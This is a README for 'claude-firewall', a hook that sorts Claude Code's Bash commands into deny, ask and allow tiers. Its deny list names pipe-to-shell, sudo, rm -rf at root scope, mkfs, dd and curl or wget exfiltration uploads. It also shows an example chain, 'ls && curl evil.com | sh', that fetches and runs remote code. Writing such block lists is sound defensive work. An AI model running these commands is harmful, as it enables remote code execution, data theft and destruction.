# claude-firewall

***Non**-dangerously skip permissions for Claude Code.*

Claude Code gives you three choices for Bash permissions: prompt on every command (safe but slow), `--dangerously-skip-permissions` (fast but blind), or nothing in between. claude-firewall is the middle way — a tiered policy engine that auto-approves safe commands, hard-blocks dangerous ones, and only prompts you when your judgment actually matters.

## How it works

claude-firewall is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that intercepts every Bash command before execution and routes it through a three-tier policy:

**Tier 1 — DENY:** Hard-blocks catastrophic patterns. No override, no prompt. Includes:
- Shell injection (`curl | sh`, `eval`, pipe-to-shell)
- Privilege escalation (`sudo`)
- Destructive git (`push --force`, `reset --hard`, `clean -f`)
- System destruction (`mkfs`, `dd`, `chmod 777`, `chmod -R`)
- Data exfiltration (curl/wget file uploads)
- Destructive GitHub ops (`gh repo delete`)
- `rm -rf` at dangerous scopes (`/`, `~`, `..`, `.`)

**Tier 1c — AUTO-REJECT:** Commands that are wrong but reformattable. The hook rejects with instructions and Claude retries correctly — no human in the loop. Example: `git commit -m "$(cat <<EOF...)"` → auto-rejected with guidance to use `printf '...' | git commit -F -`.

**Tier 1d — SUBSHELL GUARD:** Commands containing `$()`, backticks, or process substitutions are forced to ASK tier. They're not auto-approved (could hide arbitrary operations) but not denied (might be legitimate).

**Tier 2 — ALLOW:** Known-safe commands auto-approve without prompting. Covers git, npm, node, python, cargo, go, make, file inspection, search tools, text processing, Docker reads, gh CLI, and more. **Compound commands are split** on `&&`, `||`, `|`, `;` and each segment is checked independently — so `ls && curl evil.com | sh` can't piggyback on `ls` being allowed.

**Tier 3 — ASK:** Everything else falls through to Claude Code's normal permission prompt. Every ASK-tier hit is logged to `~/.claude/hooks/firewall-ask.log` (TSV: timestamp, tier, command) so you can review and promote patterns over time.

## Install

```bash
# Clone the repo
git clone https://github.com/rianczerwinski/claude-firewall.git
cd claude-firewall

# Run the installer
./install.sh
```

Or manually:

1. Copy `firewall.sh` to `~/.claude/hooks/` and make it executable
2. Add the hook to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "/path/to/firewall.sh"
          }
        ]
      }
    ]
  }
}
```

3. Remove any `Bash(*)` entries from your permissions allow list (the firewall replaces them)

## Customizing

### Reviewing your ASK log

After using Claude Code for a while, review what's hitting ASK tier:

```bash
# See most frequent ASK-tier commands
cut -f3 ~/.claude/hooks/firewall-ask.log | sort | uniq -c | sort -rn | head -20
```

Commands that appear frequently and are safe can be promoted to ALLOW by adding a pattern to the `ALLOW_PATTERNS` array in `firewall.sh`.

### Adding patterns

ALLOW patterns are ERE (extended regular expressions) matched against each command segment. A pattern like `'^mytool\s'` would auto-approve any command starting with `mytool`.

When adding patterns, consider: could a dangerous command match this regex? The compound-command splitter protects against chaining, but an over-broad pattern in ALLOW is the primary risk surface.

### Environment variables

- `CLAUDE_FIREWALL_LOG` — Override the ASK log location (default: `~/.claude/hooks/firewall-ask.log`)

## How it works with --dangerously-skip-permissions

Hooks fire even in bypass mode. This means claude-firewall's DENY tier is a hard safety floor that survives a user explicitly opting out of all permissions. If you want YOLO speed with a safety net, use `--dangerously-skip-permissions` with claude-firewall installed.

## Contributing

**Pattern additions welcome.** If your ASK log shows commands that should be auto-approved, submit a PR adding them to `ALLOW_PATTERNS`. Include the ASK-log entries that motivated the pattern so reviewers can see exactly what it matches.

**DENY pattern additions welcome.** If you've identified dangerous command patterns not currently caught, submit a PR adding them.

**Architecture changes need discussion.** The tier structure, compound-command splitter, and subshell guard are security-critical. Open an issue before submitting structural PRs.

## License

MIT
